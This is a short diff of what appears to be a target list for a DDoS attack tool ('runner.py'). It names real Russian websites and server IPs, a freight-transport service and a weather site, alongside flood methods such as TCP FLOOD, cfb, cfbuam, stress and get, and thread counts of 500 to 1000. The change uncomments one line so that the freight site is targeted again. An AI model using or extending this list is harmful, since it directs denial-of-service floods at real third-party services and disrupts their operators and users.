@@ -12,7 +12,7 @@
 #runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000  --http-methods TCP FLOOD
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
-#https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 1000 --http-methods cfb cfbuam
+https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 1000 --http-methods cfb cfbuam
 
 http://pogoda-sv.ru/monitoring/weather_forecast/  http://pogoda-sv.ru/  https://pogoda-sv.ru/monitoring/weather_forecast/ 62.213.11.115:80 https://62.213.11.115:443 tcp://62.213.11.115:80 tcp://62.213.11.115:443 tcp://62.213.11.115:1122 tcp://62.213.11.115:1123 -t 500 --http-methods stress get head even
 
